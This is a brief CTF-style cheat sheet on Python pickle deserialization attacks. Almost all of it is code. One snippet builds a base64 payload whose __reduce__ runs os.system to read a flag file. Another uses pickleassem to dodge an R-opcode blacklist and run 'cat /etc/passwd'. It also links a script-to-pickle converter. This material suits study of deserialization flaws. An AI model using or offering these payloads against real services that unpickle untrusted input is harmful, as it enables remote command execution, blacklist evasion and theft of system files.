# Pickle

### The simplest payload
```py
import pickle
import base64


class f:
    def __reduce__(self):
        import os
        return (os.system,("sleep 5 && cat /flag",))

print(f"Payload: {base64.b64encode(pickle.dumps(f()))}")
```

## Blacklist bypasses

### No R opcode

```py
# https://github.com/gousaiyang/pickleassem

import pickle
import pickletools
import base64 

from pickleassem import PickleAssembler

pa = PickleAssembler(proto=4)
pa.push_mark()
pa.util_push('cat /etc/passwd')
pa.build_inst('os', 'system')
payload = pa.assemble()
print(base64.b64encode(payload))

```

## Convert python scripts into pickle bytecode
https://github.com/splitline/Pickora

I'm a noob so that's all for now
